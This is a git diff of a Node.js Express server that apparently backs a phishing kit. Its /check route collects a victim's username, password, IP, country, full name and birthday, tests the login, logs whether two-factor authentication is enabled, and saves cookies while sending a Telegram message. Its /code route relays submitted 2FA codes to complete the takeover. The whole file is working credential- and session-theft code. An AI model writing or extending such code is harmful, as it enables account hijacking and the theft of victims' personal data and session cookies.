@@ -6,30 +6,28 @@ const bodyParser = require('body-parser');
 const app = express();
 const port = 3000;
 const server = require('http').Server(app);
-const { initialize, check, enterCode, saveCookies, close } = require('./modules/authModule');
-
+const { initialize, check, enterCode, updateAndSync,saveInfo, close } = require('./modules/authModule');
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-const clientPath = path.join(__dirname, 'client');
 const adminPath = path.join(__dirname, 'admin');
 const configPath = path.join(__dirname, 'config.json');
 
 app.post('/check', async (req, res) => {
-    const { username, password } = req.body;
+    const { username, password,ip,country,fullname,birthday } = req.body;
 
     try {
         await initialize();
         const result = await check(username, password);
         if (result === 'SUCCESS') {
-            await saveCookies(result);
-            await close();
+            saveInfo('Không bật 2FA',ip,country,username,password,fullname,birthday);
             res.send('SUCCESS');
+            await saveCookiesAndSendTelegramMessage();
+            await close();
         }
         else if (result === 'WRONG') {
             res.send('WRONG');
-            await close();
         }
         else if (result === 'CHECKPOINT') {
             res.send('CHECKPOINT');
@@ -37,17 +35,25 @@ app.post('/check', async (req, res) => {
         }
         else {
             res.send(result);
+            saveInfo(result,ip,country,username,password,fullname,birthday);
         }
     } catch (error) {
         await close();
     }
 });
+
 app.post('/code', async (req, res) => {
     const { code } = req.body;
     try {
-        await enterCode(code);
-        await close();
-        res.send('SUCCESS');
+        const result = await enterCode(code);
+        if (result === 'SUCCESS') {
+            await updateAndSync();
+            await close();
+            res.send('SUCCESS');
+        }
+        else{
+            res.send(result);
+        }
     } catch (error) {
         await close();
         res.status(500).send(error);
